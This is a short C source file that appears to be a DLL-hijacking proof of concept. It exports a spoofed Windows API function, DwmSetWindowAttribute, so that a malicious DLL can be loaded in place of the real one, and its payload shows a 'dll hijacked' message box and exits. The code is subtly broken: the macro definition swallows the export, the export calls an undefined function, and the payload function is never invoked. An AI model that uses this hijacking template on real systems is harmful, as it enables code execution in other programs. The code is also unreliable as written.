#include <windows.h> 
#define DllExport __declspec (dllexport) DllExport void DwmSetWindowAttribute() { egg();}

int pwnme() 
{
MessageBox(0, "dll hijacked !! ", "Dll Message", MB_OK); 
exit(0); 
return 0; 
}